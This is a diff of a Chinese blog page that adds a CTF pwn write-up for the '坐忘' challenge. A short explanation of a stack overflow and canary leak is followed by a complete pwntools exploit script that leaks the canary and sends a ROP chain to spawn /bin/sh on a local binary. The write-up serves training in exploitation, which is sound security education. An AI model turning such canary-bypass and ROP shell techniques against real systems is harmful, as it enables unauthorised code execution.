@@ -391,14 +391,14 @@ from LibcSearc">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        791
+                        1.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        8 分
                     </div>
                     
                 
@@ -517,8 +517,107 @@ r.sendline(payload1)
 r.interactive()
 
 </code></pre><p>纪念一下：<br>  <img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/2.png" title="This is an image"></p>
-<p>  未完待续。。。。</p>
+<h3 id="坐忘"><a href="#坐忘" class="headerlink" title="坐忘"></a>坐忘</h3><p>这个题目最初看到有malloc第一时间想到的肯定是堆的题目，但是这是个栈上的题目<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/3.png" title="This is an image"><br>这里的scanf存在栈溢出，同时puts函数可以帮助我们泄露出栈里面的内容，这就使得canary的保护被成功破解，但是这是个静态编译的文件，我们想到的自然就是构造系统调用的rop来getshell，说实话这个rop的构造算是很复杂的了。。。</p>
+<pre><code>#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+from base64 import b64encode
+context.log_level = &#39;debug&#39;
+r = process(&#39;./pwn9&#39;)
+r.recvuntil(&#39;&gt;\n&#39;)
+#gdb.attach(r,&#39;b *0x0000000004011AC\nc&#39;)
+payload1 = &#39;a&#39; * 9
+r.sendline(b64encode(payload1))
+r.recvuntil(&#39;aaaaaaaaa&#39;)
+canary = u64(&#39;\x00&#39;+r.recv(7))
+print hex(canary)
+r.recvuntil(&#39;continue ?&#39;)
+r.sendline(&#39;a&#39;)
+r.recvuntil(&#39;&gt;\n&#39;)
+p2 = &#39;&#39;
+p2 += p64(0x0000000000401f57) # pop rsi ; ret
+p2 += p64(0x00000000006cb080) # @ .data
+p2 += p64(0x00000000004715e4) # pop rax ; ret
+p2 += &#39;/bin//sh&#39;
+p2 += p64( 0x000000000047cd21) # mov qword ptr [rsi], rax ; ret
+p2 += p64( 0x0000000000401f57) # pop rsi ; ret
+p2 += p64( 0x00000000006cb088) # @ .data + 8
+p2 += p64( 0x0000000000426baf) # xor rax, rax ; ret
+p2 += p64( 0x000000000047cd21) # mov qword ptr [rsi], rax ; ret
+p2 += p64( 0x0000000000401e36) # pop rdi ; ret
+p2 += p64( 0x00000000006cb080) # @ .data
+p2 += p64( 0x0000000000401f57) # pop rsi ; ret
+p2 += p64( 0x00000000006cb088) # @ .data + 8
+p2 += p64( 0x00000000004433e6) # pop rdx ; ret
+p2 += p64( 0x00000000006cb088) # @ .data + 8
+p2 += p64( 0x0000000000426baf) # xor rax, rax ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000046f140) # add rax, 1 ; ret
+p2 += p64( 0x000000000044d821) # syscall
+gdb.attach(r,&#39;b *0x0000000004011AC\nc&#39;)
+payload12 = &#39;a&#39; * 8 + p64(canary) + &#39;a&#39; * 8 + p2
+r.sendline(b64encode(payload12))
+r.sendline(&#39;no&#39;)
+r.interactive()
 
+</code></pre>
             </div>
             <hr>
 
@@ -847,7 +946,7 @@ fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128by
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">9.4k</span>
+                <span class="white-color">10.2k</span>
             
 
             
